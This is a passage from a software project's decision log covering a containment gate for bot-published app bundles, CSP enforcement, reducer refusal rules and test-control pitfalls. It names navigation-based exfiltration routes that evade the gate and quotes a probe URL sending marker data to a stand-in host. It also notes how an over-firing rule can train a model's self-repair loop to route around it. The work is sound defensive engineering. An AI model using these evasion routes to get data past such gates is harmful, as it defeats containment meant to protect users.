  §9 (line 388) and the §11 risk table (line 425) both still read "primary
  boundary", and both are outside this round's §5-only scope for that file.**

  **The routes the audit named are now modeled**, each with a fixture that
  trips `navigation-vector` and nothing else, each `PASSES CLEAN` against
  `HEAD`'s gate:

  - **The Navigation API** — `window.navigation.navigate()` and the bare
    `navigation.navigate()`. The audit reproduced it end to end: a bundle
    calling it from a click handler passed the gate with `ok: true` and zero
    violations while the request reached the attacker origin in Chromium.
    The sandbox-posture matrix did not probe it either, which was left as a
    follow-up for that suite rather than for this file. **Closed in D171:**
    `nav-navigation-api` is now a probe in `navigation.spec.ts`, measured
    on all three engines. It reproduces exactly as recorded here — under
    `A/no-csp` on chromium it reaches the attacker and commits — and the
    shipped policy blocks it at preflight with zero hits. The API does not
    exist on firefox or webkit, which the probe reports as `API-ABSENT`
    rather than letting a missing API score as containment.
  - **`<area href>`** — rule 3 skips an `href` on `a` AND `area` as
    "navigation, handled by rule 5", and rule 5's pattern was `<a\b`, which
    cannot match `<area`. The tag was handled by neither rule and passed the
    whole gate.
  - **htm spread attributes on a navigating tag** (`<a ...${{ href }}>`,
    `<meta ...${{ httpEquiv }}>`) — no attribute NAME appears in the markup,
    so the literal patterns see only `<a `. Reported the same way rule 3
    reports an interpolated `src`: built at runtime, therefore unverifiable.
  - **The imperative markup routes** — `innerHTML`/`outerHTML` assignment
    and `insertAdjacentHTML`, which are `document.write`'s trick spelled
    without `document.write`. Whatever goes in is markup no span ever
    separated.

  **A behavioral half was added**, and it is the better oracle of the two: it
  reads `a[href], area[href], meta[http-equiv]` out of the rendered DOM
  after every pass and after activation, so a navigating element
  assembled from a spread prop, from a runtime string, or inside a click
  handler is caught without the assembly route being one this file models.
  The demonstration that this is a real widening rather than a second copy
  of the lexical half: `<a>` with no `href` passes every pattern in the file
  (there is no `href` to match), and a click handler calling
  `setAttribute("hre" + "f", …)` on it is not a route the scan models — so
  after the press the rendered DOM is the only thing that can see it, and it
  does. Still not a boundary: it reaches only the paths activation managed
  to reach, which is exactly what the new skips report.

  **The two narrowings, and why they cost nothing.** The bare `location`
  identifier is no longer matched: `wrapBundleSource` shadows it inside the
  bundle's own scope with an inert stand-in (D45), so the bare form navigates
  nothing in production, while `location` is what a potluck, a meetup or an
  event app calls the place it happens. The member form — the one D45
  measured as NOT blocked — is what the rule matches now. A test asserts
  `wrapBundleSource` still emits `(function (location) {`, so if the shim
  goes away the narrowing fails loudly instead of rotting. And a bare
  `open(` no longer fires when the bundle BINDS `open` itself — a modal, an
  accordion, a drawer — because a declared identifier is that declaration and
  not the global; `window.open` is untouched, since a local cannot shadow a
  property access. The same suppression covers a bound `navigation`.

  Both relaxations are lexical and therefore approximate in both directions:
  a declaration anywhere suppresses the bare form everywhere, and
  `const open = window.open` walks past it. That is affordable here and would
  not be in a boundary, which is the practical difference the honest label
  makes. It is also the reason the false positives mattered more than the
  evasions: a rule whose commonest firing is wrong trains a self-repair loop
  to work around it, and the routes it would find while working around it are
  the ones the rule does not model.

  Shown failing both ways. The two false positives were
  `before=navigation-vector` and are now `PASSES CLEAN`
  (`data-field-named-location`, `modal-with-an-open-function`); a bare
  `open(` with nothing binding the name, and `window.open` in a bundle that
  DOES bind `open`, both still fail.

- **D94: a structural refusal aborts its entry too — the split was never
  about resources, so the set is no longer named for them.** D91 moved
  cap-refused ops onto the abort side and pinned `structure` — writing
  through a scalar, appending onto a non-array — on the skip side as a known
  residual, because that amendment ratified resource caps only. The residual
  was the same bug. `/history` holding a scalar refuses the rollover's
  archiving `set` at any size at all, the `del /today` after it still
  applied, and the day was destroyed exactly as it was at the cap. The
  amendment's purpose is that a destructive op must not run after the op
  guarding it was refused; whether the guard failed for size or for shape is
  not something the destroyed day can tell apart. `structure` moves to the
  abort side. `grammar` is now alone on the skip side.

  With three members the name `RESOURCE_REFUSALS` had stopped describing
  them, and a set named for a category it no longer holds is worse than no
  name — the legibility of the distinction was the point of D91's single
  classification. It was `STATE_REFUSALS` at the time — **superseded by D98:
  the set is deleted and every refusal aborts.** As written then: **the refusals state makes, as
  opposed to the one the op makes about itself.** `grammar` means this is not
  a well-formed op — a bad or over-long pointer, a forbidden segment,
  `$actor` misuse, a value that is not surface JSON — so nothing was ever
  asked of state, the refusal is identical against every state, and the rest
  of a mostly correct entry still applies. The three in the set mean the op is
  well formed and is exactly what the author meant, and state cannot take the
  write: its shape has no such path, or the result is more than state may
  hold.

  **The criterion, stated so the next kind has an obvious home: which of the
  two was wrong — the op, or the state it was applied to?** It is
  deliberately not "could the author have seen it coming". D91 already made
  that call for `depth-cap`, which is computable from the op alone and would
  sort with `grammar` on a detectability test; it aborts because of what it
  _means_. Adopting detectability as the criterion now would have to move
  `depth-cap` back, and a `del` after a depth-refused `set` destroys data the
  same way. The doc comment says which test is in force and names `depth-cap`
  as the member that fails the other one, so the judgment is visible rather
  than inferred.

  Determinism was re-checked rather than assumed, because it is the condition
  for touching the reducer at all. A structural refusal is a function of the
  folded state and the op; the folded state is a pure function of the post log
  (sorted by sequence number then blob index, unsequenced posts never fold);
  so it is no less determined than a cap, and every client aborts at the same
  op of the same entry. It reads no clock, no allocator, nothing client-local.
  Two property tests hold it: shuffling a log containing a structurally
  aborted entry converges on the identical reduction, and folding that log in
  two batches lands in the same place as folding it whole.

  `stateFull` stays size-cap-only, and the reasoning survived the widening —
  it is the flag a host repairs by snapshotting and pruning, which is what
  "dashboard full" asks for, and pruning neither makes a path shallower nor
  turns a scalar into an object. Raising it for a structural refusal would
  send a host to a repair that cannot work. `abortedEventCount` reports all
  three; it is what a host reads to learn its last entry landed only in part.

  Shown failing first. Against the pre-change reducer the rollover into a
  scalar `/history` left `state.today` as `undefined` — the day gone — and
  the new prefix property shrank to the bare `[{"op":"del","path":"/today"}]`,
  the same counterexample D91's cap property produced. After the change both
  pass and `/today` is untouched. Mutation-checked both ways: taking
  `structure` back out of `STATE_REFUSALS` (as it then was; see D98) fails all three new tests, adding
  `grammar` to it fails the two author-error controls and the `$actor` case,
  removing `depth-cap` fails the depth control, and raising `stateFull` for
  every member of the set fails the depth and structure controls.

  **One thing found in the same place the third kind was hiding, and it is
  not a fourth refusal — it is a shape mismatch that is not a refusal at
  all.** `del /a/b` where `/a` holds a scalar returns success with
  `changed: false`, while `del /a/b` where `/a` holds an array returns a
  `structure` refusal. Both mean "there is nothing at that path". Before this
  change the two were indistinguishable in effect, since a skipped op and a
  no-op both continue the entry; now one aborts the entry and the other does
  not. The divergence is in the safe direction — it refuses too much, never
  too little — so it is a false abort rather than a loss, and it is pinned by
  a test marked unratified rather than ruled on here. If it is ever taken up,
  §7's own rule that "`del` on a missing path is a no-op" says the array
  branch is the odd one out.

  Downstream nothing shifted: the full `packages/api` suite, the shared
  hydration and adapter suites, the app's surface view-state suite, and the
  whole `tlon-skill` unit suite (which covers `surface snapshot`, the publish
  migration fold, and the gate's fold smoke) are green with no assertion
  changed outside the reducer's own tests. The gate's per-action fold is
  strictly better off: it now leaves a prefix rather than a subsequence, and
  its once-vs-twice idempotency comparison is unaffected because both folds
  abort at the same op. One pre-existing gap is worth naming because this
  widening makes it likelier to matter: `surface state` prints `stateFull`
  but never `abortedEventCount`, so a structurally aborted entry is reported
  to a host as nothing at all.

- **D95: `blockedURI` is attacker-chosen, so the listener reads two of its
  members and hashes the rest — and the bound is two bounds, in an order
  that matters.** Once the host policy enforces, `report-uri` is
  unavailable in a `<meta>` (CSP3 §3.3, the same clause that excludes
  Report-Only), so there is no server-side record of a refusal anywhere and
  `SecurityPolicyViolationEvent` is the only signal left.
  `src/logic/hostCspViolations.ts` is that listener, installed by main.tsx
  before the app mounts.

  **Sanitisation is by construction, not by redaction.** The blocked URL is
  parsed and only `protocol` and `host` are ever READ; `pathname`, `search`
  and `hash` — where an exfiltration payload would sit — are not stripped,
  they are never reached. The host is lowercased, restricted to
  `[a-z0-9.:[\]-]` with any other character rewritten, truncated at 64, and
  both the rewrite and the truncation are reported as flags so a sanitised
  value is never mistaken for a faithful one. Scheme, directive and
  disposition are each mapped onto a fixed set or reported as `other` /
  `unknown` — the engine's own strings never pass through. The full raw
  value survives only as a 32-bit FNV-1a hash, which is the dedupe key: it
  says "the same URL again" without saying what the URL was.

  **The residual is stated rather than papered over.** `blockedHost` is
  still up to 64 bundle-influenced characters, so the channel into
  telemetry is not zero — it is bounded at 5 × 64 constrained characters
  per page load. It is kept because it is the field that makes the signal
  actionable at all: the point of a violation report is to learn WHICH
  origin nobody allowlisted, and a design that emitted only hashes would be
  unable to answer the question it exists to answer.

  **Two bounds, and the order is the load-bearing part.** A hard cap of 5
  emitted events per page load is checked FIRST; only under the cap is a
  violation deduped against the ones already emitted. Deduping first would
  let a bundle looping over DISTINCT URLs grow the dedupe set forever — the
  set only ever gains an entry when an event is emitted, so it inherits the
  cap. Suppressed violations increment `dropped` rather than emitting, so
  suppression is visible without costing another event.

  **Measured both ways, in the dev harness and not only in a unit test.**
  20 identical violations produce `emitted: 1, dropped: 19`; 20 distinct
  ones produce `emitted: 5, dropped: 15`; framing an allowlisted origin
  produces `emitted: 0`. The last is the mechanism control — without it a
  clean Report-Only run would be indistinguishable from a dead listener.
  The observed record for a real enforced violation, verbatim:

      { "bound": 5, "emitted": 1, "dropped": 19, "enforcing": true,
        "records": [ { "seq": 1, "directive": "frame-src",
          "disposition": "enforce", "policy": "host-frame-src",
          "blockedKind": "origin", "blockedScheme": "https",
          "blockedHost": "csp-probe.invalid", "blockedHostTruncated": false,
          "blockedHostRewritten": false, "blockedUriHash": "8612bbb4",
          "enforcing": true } ] }

  The frame was `https://csp-probe.invalid/exfil-marker-4c1d9b?stolen=exfil-marker-4c1d9b#exfil-marker-4c1d9b`,
  and the marker appears nowhere in the serialised snapshot.

- **D96: "the posture suite under enforcement" was not a claim that suite
  could make, in either direction, until a shipped-policy row existed.**
  The flip was gated on the sandbox-posture matrix passing "under
  enforcement", on the premise that the existing matrix had been measured
  with `ENFORCE_HOST_CSP` off. The premise does not hold: the suite builds
  its own host pages on its own HTTP servers and never reads the flag, so
  turning it on cannot change a single cell. The gate as written was
  therefore satisfiable by a run that proved nothing new.

  What the seven existing configurations did measure was that a `frame-src`
  allowlist OF THE RIGHT KIND blocks — `'none'`, `'self'`, and
  `https://example.com`. None of them was the string this app ships, and
  `frame-src 'self' https://tlon.network` is a longer source list than any
  of them. "An allowlist blocks" and "OUR allowlist, in OUR delivery,
  blocks" are different claims, and only the second is about what ships.

  So an eighth configuration was added, `C/meta/shipped-policy`: it imports
  `HOST_CSP_POLICY` from hostCsp.ts and delivers it through the same
  `<meta>` the build injects, against the same live attacker HTTP server
  that logs its own hits. That makes the phrase mean something. Measured
  159/159 on chromium, firefox and webkit, all five self-navigation vectors
  at BLOCKED-PREFLIGHT with `attackerServerHits=0` and `committed=false` on
  every engine, while the srcdoc sandbox frame still loaded. What the flag
  actually decides — whether index.html carries the policy at all — is a
  different fact and is asserted in `hostCsp.test.ts`, against both branches
  of the flag, plus by grepping the real build output.

  **Two runs, because they are two claims.** The posture matrix proves the
  policy BLOCKS; it says nothing about whether the allowlist is COMPLETE,
  because it never loads the app. Completeness came from the full Playwright
  e2e suite under Report-Only: 31.2 minutes, 72 passed / 2 failed (unrelated
  UI strict-mode flake) / 6 skipped, with the ship fixtures draining the
  in-page collector per test. 101 app pages drained, 101 carried a live
  collector, every one `emitted: 0, dropped: 0`. The zero is not vacuous:
  `e2e/host-csp.spec.ts` ran inside that same suite and made the same
  listener fire on a real violation, so the instrument was demonstrably
  alive in the environment that produced the zeroes. `ENFORCE_HOST_CSP` is
  now `true`, and the enforcing `<meta>` is present in the built
  `dist/index.html`.

  **The collector records every page it drained, including the clean ones**,
  for the same reason: an empty log cannot distinguish "nothing violated"
  from "nothing was ever looked at". Recorded gaps rather than assumed
  absence: the 6 skips were the ~bus protocol-mismatch pair, invite-service
  (needs ~mug), media-viewer (needs S3 credentials) and production-smoke;
  and ManageAccountScreen — the one FRAME_SRC_SOURCES entry a real feature
  depends on — has no e2e coverage at all, so it is covered instead by the
  allowlisted-origin case in host-csp.spec.ts.

- **D97: the flip turns the Report-Only header OFF, because two policies
  refusing the same frame report it twice.** `transformIndexHtml` runs on
  the dev server too, so the moment `ENFORCE_HOST_CSP` went true, dev and
  preview began carrying the same enforcing `<meta>` production carries.
  Leaving the Report-Only header on would have put the page under TWO
  policies that refuse the same frames, and the engine fires one
  `SecurityPolicyViolationEvent` per policy — so every real violation would
  have arrived twice, spending two of the listener's five bounded events to
  report one fact, and it would have silently broken the "exactly one
  bounded event" control in host-csp.spec.ts, whose obvious repair would
  have been to loosen the assertion.

  `hostCspDevHeaders` is therefore `{}` while enforcing and the Report-Only
  header otherwise, and `hostCsp.test.ts` asserts the invariant directly:
  injected metas plus header count is exactly 1. Verified live — the dev
  server now returns no `Content-Security-Policy-Report-Only` and serves
  `<meta http-equiv="Content-Security-Policy" content="frame-src 'self'
https://tlon.network">`. The consequence worth naming: dev now matches
  production instead of approximating it, and the Report-Only validation
  surface is one `ENFORCE_HOST_CSP = false` away whenever the allowlist has
  to be re-validated against real usage.

  Also corrected while here, because the three-engine run contradicted
  them: hostCsp.ts described "four self-navigation vectors against seven
  host configurations" and claimed that with no host CSP "every vector
  reaches the attacker". There are five vectors and now eight
  configurations, and under `A/no-csp` only the three the in-realm shim does
  not reach get through — `nav-replace` and `nav-href` are BLOCKED-PREFLIGHT
  in every configuration including the ones that deliberately allowlist the
  attacker, which is exactly what keeps the shim from being read as policy.

## Post-review dispositions (both re-verification passes)

Two independent reviews ran over the fix round — correctness (external) and
containment (internal, because the external reviewer's provider refuses that
subject matter). 26 findings. These are the rulings and what they cost.

- **D98: every refusal aborts its entry; the skip/abort criterion is
  withdrawn.** D91 and D94 split refusals by _which thing was wrong — the op,
  or the state it was applied to_. That is coherent as a taxonomy and
  incoherent as a safety rule, and a review reproduced why: a path missing
  its leading `/` is a `grammar` refusal, so it skipped, and a following
  `del /today` still applied. **That is the archive-then-clear data loss the
  amendment exists to prevent**, reached through a malformed op rather than a
  well-formed one.

  Dependency safety does not track blame. Whether the ops after a refusal are
  safe depends on whether they depended on the refused one, which is true
  regardless of whose fault it was.

  `STATE_REFUSALS` is **deleted**, not emptied — a predicate that cannot be
  false is the same defect class as a guard that cannot fail. The refusal
  kinds survive for error messages and for `stateFull`; both type docs now
  record that they drive no control flow, and why.

  Accepted costs, both stated in the plan and PARADIGM: `del /list/0` is
  silent rather than an error, and a mostly-correct entry with one typo'd
  path now stops instead of applying its remainder. The second is the whole
  point.

  Supersedes the criterion in D91/D94. Those entries are annotated in place.

- **D99: `surface create` cannot prove it made the channel, and now says so.**
  D68's title check was introduced as the class fix on the reasoning that a
  title only reaches `%groups` if `%groups` took our create. The title is
  caller-chosen data, and a same-title race returned `ok`/`reused: false` for
  a channel the command did not make.

  What the backend can and cannot give, read from the Hoon rather than
  inferred: `groups.hoon` stamps `added` with the group host's own clock and
  overwrites whatever the poke carried, and subscribers store that value
  verbatim — so all `added` values for a group come from **one** clock, which
  retires the earlier objection that comparing them reads a local clock. But
  a colliding `%add` returns with **no state change and no update emitted**,
  and `ca-create` on an existing nest slogs and returns. A no-oped create
  leaves no trace anywhere, and nothing in either agent names the poking
  client — while the racer's listing is stamped by that same host clock just
  after our baseline. So `added > baseline` is satisfied by our create and
  theirs alike.

  **A baseline over `added` dates a listing; it cannot attribute one.** There
  is no host-stamped evidence of authorship available, so the honest output
  is to stop claiming it. `reused: false` is gone, replaced by
  `disposition: created-unverified | reused` plus the host stamp, and a human
  report that leads with "Poked a create for …" and an `unproven:` line. Two
  falsifiers remain, neither promoted to a verifier.

  This is the shape to prefer when a guarantee is unobtainable: refuse to
  assert it, rather than assert a weaker thing that reads like it.

- **D100: the gate's chart oracle has a limit that cannot be closed, so it is
  documented instead.** A handler reassigning `chart.options` in a microtask
  or timer passes clean. There is no synchronous microtask drain; one drain
  is one tick against a chain the app chooses (a 3-deep chain was measured
  passing); timers are a different scheduler. The general form: an oracle
  reading a mutable object at a chosen instant is evaded by writing after it,
  and the gate's instant is finite while the app's turn is not.

  `LiveChart`'s claim is narrowed from "what it ended up being" to "as of
  that read", and a fixture pins the miss so it cannot be quietly
  re-described as closed. Acceptable because this is a **quality** rule: a
  chart that resizes badly one tick later is a bad chart, not a containment
  failure.

### Found, flagged, not fixed (post-review)

- **Publish's primary preserving path still snapshots over aborted entries**
  without complaint, while its retry path and `surface snapshot` now refuse.
  Closing it means a fourth control on a second command, on a path where
  refusing blocks the migration entirely.
- **A non-host republishing over a stranded channel** now exits 1 naming the
  host instead of falsely reporting `no-op`. Correct, but a behaviour change
  beyond "post the missing snapshot".
- **Bracket-form property access** (`el["innerHTML"]`, `window["location"]`)
  stays open in the gate. It is the property-access class, not the
  enumeration class, and cannot be closed lexically.
- **`onchange`/`oninput` handlers are not observed** by the activation phase.
  Only `onclick` is wrapped. The docstring says so rather than implying the
  property route is closed.
- **The ninth-name test's final assertion cannot fail** — the title it checks
  stays put under the bug and under the fix, since a poke onto a taken name
  no-ops either way. The real control is the `createPokes` assertion beside
  it. Left in place, reported.
- **Six CLI-build sites maintained by memory.** Two gitignored build
  prerequisites (`api/dist`, `surface-shell/dist`) are hand-repeated across
  six places; every site remembered the older one and four forgot the newer.
  The recommendation on record is to converge the two duplicate
  `bun build scripts/main.ts --compile` invocations into one and preflight
  the artifact there, rather than build a static guard across YAML, shell and
  TypeScript.

### The pattern this round is actually about

**Eight guards that could not fail, or could not fail for the reason they
claimed.** Four were written by the fix round itself, as the evidence that
its fixes worked, and one by the author of this list while cataloguing the
other seven. The species vary and are worth distinguishing, because they
need different defences:

1. **Computed from itself** — the pin test whose coverage was `schema −
exclusions`, so a new column always landed in "updated".
2. **Satisfiable without the subject** — a CI gate the flag under test could
   not affect.
3. **Tests the implementation, not the requirement** — `surface create`'s
   control used a _different_ title than the collision case it existed to
   catch.
4. **Claims a mechanism it does not exercise** — the "two batches"
   convergence test folded once; the reducer has no incremental interface at
   all, so the claim was never implementable.
5. **The double cannot express the defect** — `applyCreate` could not model
   D50's silent no-op; the fake stamped every channel `added: 1`, so a create
   could confirm itself against a number nothing moves.
6. **True under the bug and under the fix** — the ninth-name title assertion.
7. **Made vacuous by a later fix** — a pre-existing test that reached its
   assertion through the very case `foldForMigration` now refuses, and would
   have kept passing for an unrelated reason.
8. **Compares a thing against itself** — the revert test for the openclaw
   type failure reverted `packages/api/src` without rebuilding, while
   openclaw resolves that package through `dist/index.d.ts`. It therefore
   compared our build against our build, and reported "not ours" twice, into
   two documents. Structurally the same as (2) — satisfiable without the
   subject — but worth its own name because the shape recurs: a
   **differential experiment whose arms did not differ**. Committed by the
   author of this list, mid-round, in a round about controls that cannot
   fail.

The rule "no control without a demonstration that it can fail" is necessary
and was not sufficient: nobody applied it to the demonstrations. (5) is the
one to weight going forward — a test double that cannot express a defect
silently bounds what the whole suite can find, and neither review would have
caught it from the test code alone.

The defence against (8) is mechanical and belongs in the process rules: any
differential experiment — revert, A/B, before/after — must **hash the
artifact actually consumed in both arms and assert the hashes differ**
before its result is reported. "I changed the source" is not evidence the
compared thing changed.

(Bookkeeping, Session 6a: this list was headed "Seven" and enumerated seven
while the peer report enumerated eight and separately called them "six
species"; the session prompt inherited "six". Species 8 existed only in the
peer report and had never been written here. Corrected above. The lesson is
the same one D92/D93 exist for — an audit that lives only in a session
transcript is an audit that will be lost, and this project has now lost two.)

## Session 6a — harness repair, hardening, and the bot loop's preconditions

- **D101: the publish loop gets a repo-owned dev storage path, selected
  explicitly and never by fallback.** The unnumbered Session-5 ruling
  (`DECISIONS.md:1644`) gave two acceptable outcomes: the CLI grows a
  documented dev-storage story, or the plan says plainly the loop is
  unrunnable locally. This takes the first. The seed's bundle server, which
  already stood in for remote storage when _serving_, now takes uploads at
  `PUT /<sha256>.js`; `pnpm seed:storage` runs it without seeding nine
  fixtures.

  Selection is `TLON_SURFACE_DEV_STORAGE`, and there is no fallback in either
  direction. Unset, the real storage functions are untouched and a
  storage-less ship still fails `storage-unavailable` — dev storage is never
  reached _because_ real storage was missing, only because someone named it.
  Set, it replaces both the preflight and the upload or neither: replacing
  only the upload would gate publish on a bucket nothing writes to, and
  replacing only the preflight would pass the gate and upload nowhere.
  Naming it is still not sufficient — see D109.

  **The store is content-addressed, and that is a divergence from production,
  not parity with it.** It enforces the key shape `<64 hex>.js` and refuses
  anything else, so a regression to a timestamped key fails at publish rather
  than quietly minting two URLs for identical bytes. Production has no such
  property: `uploadFile` builds `<ship>/<@da-now>-<name>`
  (`storageApi.ts:209`), which `bundleFileName`'s own comment calls
  content-NAMED. The dev store is _stricter_ than what it stands in for, so a
  green dev run is not evidence about production key stability. Recorded
  rather than left to be inferred, because plan §76 asserts content-addressed
  naming that production does not implement.

  It deliberately does **not** bind key to bytes. Real S3 does not either;
  doing so would make storage a party to trust, contra §3's "storage is
  transport, not trust", and would make the tampered-bundle case
  inexpressible — which is the case the client's hash verification exists
  for, and the negative control here.

- **D102: `insertGroups` keeps the classified exclusion list; the
  payload-key derivation is refuted.** Drizzle admits the derivation
  mechanically (`sqlite-core/dialect.js:59-74`), but it is unsound here for
  three reasons. (1) The relevant predicate is `value === undefined`, not key
  absence (`dialect.js:307`) — `toClientChannel` always emits a
  `contentConfiguration` key whose value is often `undefined`, so
  `Object.keys` computes the wrong set; over the recorded fixture the payload
  carries 14 keys but 13 defined values, which reconciles D77's "13 of 29"
  with the structural count. (2) "Carries" is not "is authoritative for": the
  sync payload carries `currentUserIsMember`, which `agentGroupOnboarding`
  depends on this write _not_ touching, while a DB-read group carries all 29
  — so a derived set would vary by caller. (3) It is a multi-row insert with
  one `set` clause, and the fixture's `~fabled-faster/new-york` batch has 8
  of 12 channels carrying `description` and 4 not; union erases, intersection
  pins.

  Decisively, a differential experiment showed the derivation breaks
  convergence. The `meta` cell is a snapshot, so an admin clearing a
  description sends a payload without one and **the null-fill is the correct
  clear**. Under the derivation `description` stayed `'original'`; under the
  classified list it went `null`. The existing 99-test suite passed under the
  derivation — only `description` and `contentConfiguration` diverge and
  neither was covered — which is itself why the parity test below was needed.

  Landed instead: a null-fill parity test that seeds all 29 columns with
  distinct non-null values, **verifies the seed populated** (guarding the
  "double cannot express the defect" species), syncs a real payload through
  the real `insertGroups`, and asserts byte-equality via raw SQL for every
  column the encoder can never populate. The preserved set is derived by
  running the real encoder over a corpus, **not** from
  `channelConflictExclusions` — so it is not computed from itself, which is
  what made the previous pin test species-1 vacuous. Control: with
  `addedToGroupAt` removed from the exclusions _and_ the pin list amended to
  accept it — what a developer following the pin test would do — the pin test
  passes and only the parity test fails.

- **D103: type-level drift guards go per generic-helper application site,
  not per exported union.** `entrySizeCapped` wraps a union member, so its
  degradation is contagious and any union-level guard catches it.
  `sizeCapped` wraps _fields_ — `initialState`, `recipe`, snapshot `state` —
  so degrading it leaves every union a proper union while three fields become
  `any`, which no union guard can see. Demonstrated by stripping its
  annotation and observing only the four field-level assertions fail. Not
  hypothetical: `d5c41acdc5`'s own message records those fields _were_ `any`
  in production.

  Vocabulary is `AssertTrue`/`AssertFalse`/`IsAny` in
  `packages/api/src/client/typeAssertions.ts` plus `@ts-expect-error`,
  enforced by `tsc --noEmit` (`pnpm -r tsc`, `ci.yml:141`), not by vitest.
  **Correction to a working assumption made during the session:**
  `expectTypeOf` was rejected on convention and dependency grounds, not on
  enforceability — contrary to what was briefed, expect-type encodes failure
  as a type error and _would_ have been caught by plain `tsc`. Probed rather
  than assumed.

- **D104: the primary preserving publish refuses over an aborted fold, and
  every escape hatch names what it waived.** Supersedes the "Found, flagged,
  not fixed" bullet at `DECISIONS.md:2925-2928`, which recorded the asymmetry
  as a deliberate open choice and **should be read as struck**.

  The premise that made that choice look defensible was wrong in its second
  clause. Refusing does not block the migration: `foldForMigration` runs
  before `writeGroupChannel`, so the refusal leaves the channel exactly as it
  was — at a revision that still folds, with the aborted entries still
  visible to `surface state` and still re-postable. It cannot re-open the
  stranding, because nothing has been written when it fires. And the loss it
  permitted is _worse_ on this path than on the two that refused: the frozen
  entries are tagged with the revision being left behind, and a revision that
  no longer folds cannot have its lost ops re-posted at all. Measured
  pre-fix: exit 0, `"outcome": "published"`, two entries frozen under
  boundary 23, and afterwards the fold reports **zero** aborts.

  All three snapshot-writing paths — standalone `surface snapshot` (both its
  ordinary and its migration-repair branch), the publish retry, and the
  primary preserving publish — now funnel through one
  `assertNoAbortedEntries`, and `surface publish` carries the same
  `--allow-aborted-events` flag. The retry path's remedy, which used to send
  the publisher to a _different command_, now names the flag on the command
  they are already running: a refusal that can only be lifted from somewhere
  else teaches a repair loop to try commands rather than read them.

  The escape hatch leaves an audit trail (D99): `abortedEventCount` is
  **replaced** by `abortedSequenceNums`, not joined by it — a count is
  `.length`, and two representations of one fact are free to drift. The flag
  is the last moment anything can name these entries, since the snapshot it
  permits puts them under the boundary and every later fold reports a clean
  history. The array carries the same determinism obligation as every other
  reduction field and is pinned by a shuffle property; a count could not have
  carried that obligation, because there was no ordering to get wrong.

  Accepted cost: the refusal is pre-channel-write but **not pre-upload**.
  Bundles are content-named, so an orphaned upload is idempotent litter;
  hoisting the check above the upload would need the revision number before
  `assetRef` exists.

  Client-side gap, not closed: `packages/shared/src/store/surface/hydration.ts`
  propagates `stateFull` but has never propagated the abort field, so the
  in-app client shows nothing when a host's entry stops early. The CLI is the
  only place it surfaces.

- **D105: the doctrine is delivered by the CLI, conditionally.** D74 offered
  two remedies — inline into SKILL.md's preprocessing includes, or reach by
  ordinary file read. This takes a third, an _extension_ rather than
  something D74 asked for: `tlon surface doctrine|primitives|rubric` print
  `PARADIGM.md`, `PRIMITIVES.md` and `RUBRIC.md` from the installed package,
  and SKILL.md points at commands instead of file paths. `templates/**`, the
  fourth item on D74's unreachable list, was already covered by
  `surface templates show`.

  **The claim this earns is narrower than "reachable by construction"**: the
  doctrine stops depending on a second, runtime-dependent mechanism and
  inherits the same single precondition as the rest of the skill — that the
  bot may invoke the `surface` command group. That precondition was not
  satisfied when the work was done; see D106.

  Location follows D73, **with a correction to how that trap was stated**:
  `bun build --compile` does not merely bake the build machine's path, it
  bakes the _entrypoint's_ directory for every module in the bundle, so a
  `__dirname`-relative lookup correct from source can be wrong by a directory
  in the binary. Measured: a two-level computation from `scripts/commands/`
  resolved to `packages/skills/surfaces`. Resolution therefore searches
  upward rather than counting, and the controls run against the compiled
  binary in a staged install layout, because source mode masks the whole
  defect class. Nothing is embedded, so there is no stale-copy drift; the two
  things that _can_ diverge — the shipped file set and the command's
  rendering — each carry a control demonstrated failing.

  A missing document and an empty one both refuse. Printing nothing at exit 0
  is the silent degradation these commands exist to end.

- **D106: `surface` is admitted to the model-facing tool allowlist as a whole
  command group, gated by telemetry rather than a second per-subcommand
  guard.** The subcommands do span a real risk range — `lint`, `preview`,
  `templates` and the documentation commands touch no ship and no
  credentials, while `publish` writes the description cell that decides what
  code clients execute. That range does not justify a second gate, for three
  reasons.

  (1) **The cell is already reachable from the same allowlist.**
  `channels update --description` re-encodes it as
  `{description, channelContentConfiguration}` and drops a `surfaceSpec` it
  did not write, so the bot can already destroy a published app's trust root
  with no gate, no confirmation, and telemetry that reads as a benign edit.
  Refusing `publish` would have left the capability and removed the
  disciplined path to it. (2) The residual that is genuinely new — minting
  the pointer rather than clobbering it — is bounded by the group admin role
  the bot must already hold to `groups ban` or `channels delete` in the same
  group. (3) SECURITY.md §13 already restricts the whole `tlon` tool to owner
  and internal sessions at the `before_tool_call` hook.

  A plugin-side enumeration of surface subcommands was also rejected: the
  guard is duplicated per runtime because the skill package publishes no
  source, so a copy can only drift, and drift _there_ refuses commands that
  exist — a hazard demonstrated in the same session by the concurrent
  addition of `doctrine`/`primitives`/`rubric`.

  What the risk range earned is telemetry: `publish` → `admin`,
  `create`/`event`/`snapshot` → `write`, `state` → `read`, local-only →
  `utility`. Without it every surface command classified as
  `surface.list`/`utility`, making `publish` indistinguishable from printing
  a markdown file — the same hazard found once before when `migrate-apply`
  hid behind the read-only `migrate-plan`.

  The tool _description_ is part of the gate, not decoration: a guard that
  admits a command the model is never told about changes nothing.

- **D107: the dev container provisions its own Chromium and builds the CLI
  from the checkout.** `surface preview` could not run for two independent
  reasons: the container hydrated `tlon` from `@tloncorp/tlon-skill@0.5.0`,
  published 2026-08-07, three weeks before the `surface` group existed (the
  CLI answered `Unknown command: surface`), and `node:22-bookworm-slim`
  carries no Chromium.

  `TLON_PLAYWRIGHT_MODULE` is required, not defensive. Measured: a
  `bun build --compile` binary **does** resolve a runtime bare specifier, but
  resolves it **against the process CWD** — and the bot runs `tlon` from a
  workspace with no `node_modules/playwright` above it. The from-source build
  compiles to a container-local path and copies onto the bind mount rather
  than letting bun's temp-file-plus-rename land there; the rename failure
  that made source builds opt-in is Docker-Desktop/VirtioFS-specific and does
  not reproduce on OrbStack, so the fix removes the dependency on the rename
  rather than betting on the backend.

  The positive claim asserts exit 0, empty `shellErrors`, and cross-cell
  content divergence — **not** file existence, because a deliberately
  throwing `render()` also writes all 12 PNGs and exits 1, its cells
  rendering an error card. Cost: the dev image grows 871MB → 2.11GB.

- **D108: the 6a container reaches the fakeships over host networking, so the
  dev-storage guard needs no exception.** D101's guard fired inside the
  container, which reached its ship as `http://ships:8080`. Rather than teach
  the guard a non-loopback exception, the container runs `network_mode: host`
  and talks to the host's already-running rube fakeships. The condition is
  then not waived but **satisfied**.

  Decisive: `startBundleServer` binds `127.0.0.1` and mints
  `http://127.0.0.1:<port>/<sha256>.js` as the assetRef _no matter who
  uploads_. On a bridge network the container gets `ECONNREFUSED` on its own
  assetRef, so an allowlist would have loosened two clauses and still
  produced an incoherent artifact. Rejected: a host allowlist; inferring "is
